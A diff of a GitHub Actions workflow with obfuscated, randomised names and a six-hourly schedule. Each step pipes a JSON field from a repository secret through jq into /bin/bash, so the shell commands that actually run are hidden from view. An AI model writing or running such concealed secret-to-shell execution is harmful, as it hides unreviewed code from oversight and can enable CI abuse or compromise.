@@ -1,8 +1,9 @@
 name: dongchudai5647
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
+    - cron: '49 1/6 * * *'
 
 jobs:
   build:
@@ -12,15 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongchudai5647
         env:
-          ck4798: ${{ secrets.ck4798 }}
+          ct11: ${{ secrets.ct11 }}
         run: |
-          echo $ck4798 | jq -r .owzyk726 | /bin/bash
-          echo $jn86929 | jq -r .iqkn5 | /bin/bash
-          echo $lwo5494 | jq -r .i43 | /bin/bash
-          echo $hkvy10 | jq -r .f0030 | /bin/bash
-          echo $yjz01 | jq -r .pt7626 | /bin/bash
-          echo $swww087 | jq -r .pbs771 | /bin/bash
-          echo $para20 | jq -r .g77463 | /bin/bash
-          echo $k986 | jq -r .iymo93797 | /bin/bash
-          echo $xdb90 | jq -r .ut352 | /bin/bash
+          echo $ct11 | jq -r .cu95 | /bin/bash
+          echo $fh330 | jq -r .ejiy70 | /bin/bash
+          echo $xnnfz3 | jq -r .ro79192 | /bin/bash
+          echo $tdqm72 | jq -r .asm89 | /bin/bash
+          echo $drgi42 | jq -r .aw88 | /bin/bash
+          echo $hskb51 | jq -r .cleym0321 | /bin/bash
+          echo $o143 | jq -r .chm825 | /bin/bash
+          echo $djpr426 | jq -r .tr43292 | /bin/bash
+          echo $k8738 | jq -r .u27933 | /bin/bash
 
